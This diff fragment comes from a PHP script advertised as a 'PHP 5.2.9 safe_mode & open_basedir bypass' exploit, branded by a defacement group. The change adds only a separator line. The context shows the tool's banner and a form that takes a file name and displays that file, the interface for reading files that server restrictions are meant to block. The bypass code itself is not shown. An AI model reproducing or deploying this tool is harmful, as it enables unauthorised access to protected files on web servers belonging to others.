@@ -8,7 +8,8 @@ echo '<PRE><P>This is exploit from <a href="/" title="Securityhouse">Security Ho
 Turkish H4CK3RZ 
 <p><b> [Turkish Security Network] - Edited By KingDefacer
 <p>PHP 5.2.9 safe_mode & open_basedir bypass 
-<p>More: <a href="/">Md5Cracking.Com Crew</a> 
+<p>More: <a href="/">Md5Cracking.Com Crew</a>
+<p>--------------------------------------</p> 
 <p><form name="form" action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["SCRIPT_N 
 AME"]).$_SERVER["PHP_SELF"].'" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="Show"></form>'; 
 $level=0; 
